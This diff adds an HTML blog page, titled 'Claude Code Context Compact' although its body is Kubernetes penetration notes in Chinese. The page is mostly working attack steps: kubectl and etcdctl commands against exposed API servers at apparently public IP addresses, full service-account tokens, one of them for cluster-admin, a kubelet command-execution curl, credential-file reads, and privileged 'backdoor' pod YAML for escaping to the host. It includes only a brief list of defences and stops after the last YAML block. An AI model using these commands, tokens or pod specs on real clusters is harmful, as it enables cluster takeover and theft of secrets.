@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Claude Code Context Compact 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Claude Code Context Compact</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-01-13 09:15:00
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="k8s-攻防"><a href="#k8s-攻防" class="headerlink" title="k8s 攻防"></a>k8s 攻防</h1><p>​<code>k8s</code>架构参考 - <code>https://www.cnblogs.com/yuy0ung/articles/19136743</code>，讲的很透彻</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114103038-ri24o58.png" alt="image"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114103644-wcern6n.png" alt="image"></p>
+<p>‍</p>
+<p>假如用户想在集群里面新建一个<code>POD</code>，工作流程是怎样的</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127105800-005ium4.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h3><h4 id="API-Server-未授权"><a href="#API-Server-未授权" class="headerlink" title="API Server 未授权"></a>API Server 未授权</h4><p>​<code>API Server</code>默认服务端口-<code>8080, 6443</code>，<code>8080</code>端口提供<code>HTTP</code>服务，没有认证与授权机制，<code>6443</code>端口同样提供<code>HTTP</code>服务，但支持认证和授权。</p>
+<p>默认<code>8080</code>端口不启动，若开启会导致未授权。</p>
+<p>使用<code>kubectl</code>利用</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s http://&lt;target&gt;:8080 get nodes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114110159-3kogpr2.png" alt="image"></p>
+<p>‍</p>
+<h5 id="访问特定API获取token"><a href="#访问特定API获取token" class="headerlink" title="访问特定API获取token"></a>访问特定API获取token</h5><p>访问<code>/api/v1/namespaces/kube-system/secrets/</code>来获取<code>token</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114133540-t1hla21.png" alt="image"></p>
+<p>然后利用<code>token</code>，<code>6443</code>端口做<code>server</code>去进一步渗透</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">kubectl</span> <span class="string">--token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkFsOFNCY3huSVc2aElRNVJfX1NpbENZcG9ILWdtc25zb0JDNnN6SHVjcTQifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhcmdvY2QtbWFuYWdlci1sb25nLWxpdmVkLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFyZ29jZC1tYW5hZ2VyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYmQwNzE2ZjktN2UzZS00NTFlLWIzOTktNDY4MTYxMzNhODAzIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmFyZ29jZC1tYW5hZ2VyIn0.R9VGpWV_rexLuc8XP4CvLQ9ItnCsbbIoa1EYf0EeFlCSdXxTL4_5sIkciM9XLzaqR6IFjjWkt-LiK8iZFauraqlnWXHUCFv-KezopZoj4W919QvwKnEE_JZL6wrEXGj4S-9LwJYX6zZ-d9KLm_FI7_S3Mg9JeCIKEVVMqwU1cUuktddieyTwjBn-gFPZU7WqULRhJ6zN9ErwvOae7KadnckiMH7VznketE1PyoBjBVN3pT3ZJZtyrjNu8H4Ag5O7T-lRoIfVYN5JNfxvj8B9AeO8LHqL7MsO3W5fQhZr3S0k9CXE_hfQyAIWx42HbK4bUL0Tb7G606LeOF9d2uiRRA</span> <span class="string">-s</span> <span class="string">https://34.131.94.136:6443/</span> <span class="string">exec</span> <span class="string">-n</span> <span class="string">default</span> <span class="string">-it</span> <span class="string">demo123</span> <span class="string">--</span> <span class="string">bash</span></span><br></pre></td></tr></table></figure>
+
+<p>但可能目标配置，<code>token</code>只对特定的内网<code>IP</code>有效</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114134704-f2fhce4.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h5 id="获取Secrets资源"><a href="#获取Secrets资源" class="headerlink" title="获取Secrets资源"></a>获取Secrets资源</h5><p>在<code>k8s</code>中，<code>secret</code>对象用于存储密码，<code>OAuth</code>令牌等敏感信息，可以从中窃取其他服务的通信凭证</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//列出secrets资源</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ get secrets --all-namespaces</span><br><span class="line"></span><br><span class="line">//读指定的secrets</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ get secrets -n awi-system docker-cred -o yaml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114115453-4ig8og2.png" alt="image"></p>
+<p>​<code>base64</code>解密<code>.dockerconfigjson</code>得到<code>registry</code>用户密码敏感信息</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114115600-mh0boew.png" alt="image"></p>
+<p>‍</p>
+<p>当<code>6443</code>端口开放，若不使用凭证访问则会被服务器标记为<code>system:anonymous</code>用户，访问会是<code>401</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114111051-5jipi0c.png" alt="image"></p>
+<p>但是若配置不当，<code>system:anonumous</code>被误添加至集群管理员组<code>cluster-admin</code>，则也会发生未授权，导致集群失陷。</p>
+<p>‍</p>
+<h4 id="kubelet-未授权"><a href="#kubelet-未授权" class="headerlink" title="kubelet 未授权"></a>kubelet 未授权</h4><p>每一个<code>Node</code>节点都有<code>Kubelet</code>服务，<code>kubelet</code>监听<code>10250, 10248, 10255</code>等端口</p>
+<p>其中<code>10250</code>端口是与<code>Api server</code>进行通信的主要端口，若开启了匿名请求，就可以不带鉴权信息使用<code>10250</code>端口提供的能力</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127113656-tz4l6xh.png" alt="image"></p>
+<p>可以直接访问<code>http://xx.xx.xx.xxx:10250/pods</code>未授权获取到集群的详细信息</p>
+<p>可以在任意容器中执行命令<code>curl -k https://kubernetes-node-ip:10250/run/&lt;namespace&gt;/&lt;pod-name&gt;/&lt;container-name&gt; -d &quot;cmd=id&quot;</code>​</p>
+<p>利用执行命令<code>cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>，可以拿<code>pod</code>的<code>serviceAccount</code>的<code>Token</code>凭据，能拿到高权限的凭证可以横向到<code>Master</code>​</p>
+<p>根据访问<code>/pods</code>获取到的每个<code>pod</code>的配置信息，快速筛选出可以利用的特权容器来进行容器逃逸</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127122805-4u0hp5u.png" alt="image"></p>
+<p>但是<code>10250</code>端口目前默认是鉴权的。</p>
+<p>​<code>10255</code>端口为只读端口<code>read only</code>，默认不对外开放，对外开放如下配置<code>config.yaml</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127124251-z7uvby3.png" alt="image"></p>
+<p>若<code>10255</code>只读端口对外开放，也可以通过<code>http://xx.xx.xx.xx:10255/pods</code>访问<code>pods</code>的详细配置信息，但是不能像<code>10250</code>端口那样执行命令了</p>
+<p>除了直接在浏览器中<code>http</code>访问，也可以用<code>kubletectl</code> - <code>kubeletctl pods   --server xx.xx.xx.xx --http --port=10255</code>​</p>
+<p>只能读到一些敏感信息，利用面较小</p>
+<p>‍</p>
+<p><strong>如何防御</strong></p>
+<p>(1) 禁止匿名访问</p>
+<p>(2) 启用<code>X509</code>客户端证书认证</p>
+<p>(3) 禁止只读端口</p>
+<p>(4) 实施网络隔离，限制对<code>kublete</code>端口的访问</p>
+<p>(5) 定期审计<code>kubelet</code>访问日志</p>
+<p>‍</p>
+<p>‍</p>
+<h4 id="etcd-未授权"><a href="#etcd-未授权" class="headerlink" title="etcd 未授权"></a>etcd 未授权</h4><p>​<code>k8s</code>使用<code>etcd</code>存储数据，默认监听2379端口，若该端口暴露到公网且存在未授权访问，则可能导致敏感信息泄露，攻击者可以通过收集的凭证来尝试接管集群</p>
+<p>获取敏感信息目录</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=https://192.168.3.131:2379 --insecure-skip-tls-verify get / --prefix --keys-only | grep /secrets</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260107144402-vrzy1qs.png" alt="image"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./etcdctl --endpoints=https://192.168.3.131:2379 --insecure-skip-tls-verify get /registry/secrets/kube-system/admin-token-wqz9l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260107150614-tx6ezj7.png" alt="image"></p>
+<p>可以拿到高权限<code>cluster-admin</code>集群管理员的<code>token</code>​</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IjU1a0o1YnJPRUIzZXExeW1NeXhka21PLVBzc18xT1l1SXBvb28xSm8yc0kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi13cXo5bCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjAxOTMzZDIwLWI2Y2EtNGZiNC04MTBjLTU4N2E2YTFlNTAyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.ttsHU8viUVQMjMOsjlRmNGFdfKpcH-5tZV6hLvJa8NAS4iRWJcKmQLVyTlTtWIzPgST2YzvxGwArcwDutyvbhF19G-7CtsEA8ALBEa1OKBkstzk-bOyy1X7lVsfeuTBZP3fjIxMhunUZs8Ht6dCbqclnQvANrmQB_09PwGuTIU_3zHaZF6hV2r6uf_FkQbWMihupsaoJCdq7T1WRv1pcXxbeuentH07LVaJSVOhcXbP0EKqlNivdpLY1ktUzR4tzskbClSO4qZUtOILEz8H72ef6pBbmiiizH4XAkCx4LT-urSxU1Sa7EfLzBNUzvCJMHqwSJHfRz0GNHuf7kHZEJw#kubernetes.io/service-account-token</span><br></pre></td></tr></table></figure>
+
+<p>​<code>192.168.3.131</code>是<code>API Server</code>，可以直接用这个<code>token</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260107152823-s6ncr9a.png" alt="image"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260107154322-vld6woc.png" alt="image"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260107155557-h34u7c6.png" alt="image"></p>
+<p>‍</p>
+<h4 id="K8s-Dashboard-未授权"><a href="#K8s-Dashboard-未授权" class="headerlink" title="K8s Dashboard 未授权"></a>K8s Dashboard 未授权</h4><p>默认端口-<code>8001</code>​</p>
+<p>若用户为了方便，开启<code>enable-skip-login</code>，可以在登陆页面点击 “跳过登陆”</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127144159-5eq014t.png" alt="image"></p>
+<p>跳过登陆后，可以直接进入后台<code>dashboard</code>​</p>
+<p>跳过登陆默认是使用<code>Kubernetes-dashboard</code>默认服务账户，这样还不够，没有集群管理员权限</p>
+<p>但是有些开发者为了方便，将<code>Kubernetes-dashboard</code>账号绑定<code>cluster-admin</code>集群管理员角色么，配置示例如下所示</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>
+
+<p>最后通过创建恶意<code>pod</code>来进一步接管集群</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260127144540-hds0agc.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="Pod-Service-Account-Token"><a href="#Pod-Service-Account-Token" class="headerlink" title="Pod - Service Account Token"></a>Pod - Service Account Token</h4><p>​<code>kubernets</code>中，每个<code>pod</code>关联一个<code>Service Account</code>，<code>kubernetes</code>会自动为其生成一个<code>token</code>，并将这个<code>token</code>放在<code>pod</code>的文件系统中，默认路径为<code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>，这个<code>token</code>被用于与<code>API Server</code>进行认证，允许<code>Pod</code>根据其<code>Service Account</code>的权限进行<code>API</code>调用，从外网打进去获取<code>Pod</code>权限后，可以尝试读取该<code>Service Account</code>的<code>Token</code>，若该<code>Service Account</code>权限过高，则可以直接横向至<code>Master</code>​</p>
+<p>‍</p>
+<h4 id="Node-kubeconfig"><a href="#Node-kubeconfig" class="headerlink" title="Node - kubeconfig"></a>Node - kubeconfig</h4><p>利用<code>Docker</code>容器逃逸，从<code>pod</code>逃逸至<code>Node</code>节点宿主机后，可以获取<code>Node</code>节点的<code>kubeconfig</code>文件，<code>kubeconfig</code>文件是用于配制集群访问的文件，该文件用来组织有关集群、用户、命名空间和身份认证机制的信息，包括集群的<code>apiserver</code>地址和登录凭证，如果攻击者获取到该文件，就可以使用该凭证访问<code>k8s</code>集群</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">/root/.kube/config</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/etc/kubernetes/kubelet.conf</span></span><br></pre></td></tr></table></figure>
+
+<p>同理可以用<code>kubectl</code>来看当前获取到的<code>kubeconfig</code>的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查我是否可以在当前命名空间中执行所有操作（<span class="string">&quot;*&quot;</span> 表示全部）</span></span><br><span class="line">kubectl --kubeconfig /etc/kubernetes/kubelet.conf auth can-i &#x27;*&#x27; &#x27;*&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>若是可以创建恶意<code>Pod</code>，则可以尝试污点横向至<code>Master</code>了</p>
+<p>‍</p>
+<h4 id="污点横向"><a href="#污点横向" class="headerlink" title="污点横向"></a>污点横向</h4><p>​<code>kubernets</code>中，污点<code>Taints</code>和容忍<code>Tolerations</code>是一种机制，用来控制哪些<code>Pod</code>可以&#x2F;不能被调度到具有特定标记的节点上</p>
+<p>(1) 污点<code>Tainted</code>​</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NoSchedule：这是最常见的类型，表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。</span><br><span class="line">PreferNoSchedule：这种类型表示不推荐但允许 Pod 被调度到带有此污点的节点上。即使节点上设置了 PreferNoSchedule 污点，如果没有其他更适合的节点，Pod 仍然可以被调度到这些节点上。</span><br><span class="line">NoExecute：这种类型表示节点上的Pod会被驱逐（Eviction），即使它们已经运行在该节点上。通常，NoExecute 污点会导致 Pod 被终止并迁移到其他节点。</span><br></pre></td></tr></table></figure>
+
+<p>通常<code>master</code>节点默认添加了一个污点标记，默认是<code>NoSchedule</code>​</p>
+<p>(2) 容忍<code>Tolerations</code>​</p>
+<p>容忍允许<code>Pod</code>忽略节点的污点，从而可以被调度到具有特定污点的节点上。容忍指定在<code>Pod yaml</code>的<code>tolerations</code>字段中，它需要与节点的污点相匹配才能生效</p>
+<p>‍</p>
+<p>可以给<code>Pod</code>添加容忍的声明，让挂在宿主机根目录的恶意<code>Pod</code>能够调度到<code>Master</code>节点上，这样就可以逃逸到<code>Master</code>宿主机了</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">evilPod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">test-container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span> </span><br><span class="line">  <span class="attr">tolerations:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">    <span class="attr">effect:</span> <span class="string">NoSchedule</span>      <span class="comment"># 设置为 NoSchedule</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span>              <span class="comment"># 使用 hostPath 类型, pod 内可以直接访问宿主机文件系统</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span>              <span class="comment"># 挂载根目录，方便进行逃逸</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><strong>如何利用</strong></p>
+<p>若由于权限配置问题，某个<code>Service Account</code>拥有在某个<code>namespace</code>&#x2F;所有<code>namespace</code>创建<code>pod</code>的权限，就可以利用增加容忍创建恶意<code>Pod</code>，让恶意<code>Pod</code>调度至<code>Master</code>节点，最后逃逸，然后拿<code>kubeconfig</code>高权限凭据</p>
+<p>可以直接用<code>kubectl</code>工具查看是否有权限，参考 - <code>https://kubernetes.io/zh-cn/docs/reference/kubectl/generated/kubectl_auth/kubectl_auth_can-i/</code>​</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查该Service Account是否可以在任意命名空间中创建 Pod</span></span><br><span class="line"><span class="string">kubectl</span> <span class="string">auth</span> <span class="string">can-i</span> <span class="string">create</span> <span class="string">pods</span> <span class="string">--all-namespaces</span> <span class="string">--token</span> <span class="string">&lt;actual-token-value&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查该Service Account是否可以在指定命名空间中创建 Pod</span></span><br><span class="line"><span class="string">kubectl</span> <span class="string">auth</span> <span class="string">can-i</span> <span class="string">create</span> <span class="string">pods</span> <span class="string">--&lt;指定命名空间&gt;</span> <span class="string">--token</span> <span class="string">&lt;actual-token-value&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="权限提升-逃逸"><a href="#权限提升-逃逸" class="headerlink" title="权限提升 &amp; 逃逸"></a>权限提升 &amp; 逃逸</h3><h4 id="Pod-Node-逃逸"><a href="#Pod-Node-逃逸" class="headerlink" title="Pod -&gt; Node 逃逸"></a>Pod -&gt; Node 逃逸</h4><p>(1) <code>Docker</code>配置问题逃逸，如特权容器等等</p>
+<p>(2) 利用<code>Docker</code>历史<code>CVE</code>漏洞进行逃逸</p>
+<p>‍</p>
+<p>‍</p>
+<h4 id="创建恶意pod"><a href="#创建恶意pod" class="headerlink" title="创建恶意pod"></a>创建恶意pod</h4><p>可以先看已经存在的容器是什么，再决定恶意<code>pod</code>使用什么容器，否则可能会出现容器拉不下来的情况</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s http://34.100.182.227:8080/ get pods --all-namespaces -A</span><br><span class="line">kubectl -s http://34.100.182.227:8080/ -n default get pods demo123 -o yaml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20260114131000-rwqo0at.png" alt="image"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">host-root-backdoor</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test123</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/library/nginx:latest</span>        <span class="comment">#其他pod使用的镜像，不容易报错</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;3600&quot;</span>]</span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-root</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/host</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-proc</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span>  </span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-root</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span>                  <span class="comment"># 直接挂载宿主机根目录，方便逃逸</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">host-proc</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/proc</span></span><br><span class="line">  <span class="attr">nodeName:</span> <span class="string">awi-sam-gpu-master-6</span>    </span><br><span class="line">  <span class="attr">tolerations:</span>                 </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">effect:</span> <span class="string">NoExecute</span></span><br><span class="line">    <span class="attr">operator:</span> <span class="string">Exists</span></span><br></pre></td></tr></table></figure>
+
